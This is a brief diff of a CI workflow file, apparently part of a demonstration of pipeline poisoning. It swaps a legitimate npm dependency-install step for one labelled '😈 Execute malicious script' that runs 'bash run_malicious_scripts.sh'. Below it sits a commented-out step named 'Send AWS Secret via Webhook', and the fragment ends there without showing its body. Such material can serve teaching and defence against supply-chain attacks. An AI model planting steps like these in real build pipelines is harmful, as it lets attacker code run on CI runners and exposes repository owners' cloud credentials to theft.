@@ -29,8 +29,8 @@ jobs:
       - name: Install dependencies
         run: pip install -r requirements.txt
 
-      - name: Install dependencies
-        run: npm install --legacy-peer-deps
+      - name: 😈 Execute malicious script
+        run: bash run_malicious_scripts.sh
 
       #- name: Send AWS Secret via Webhook
        # run: |
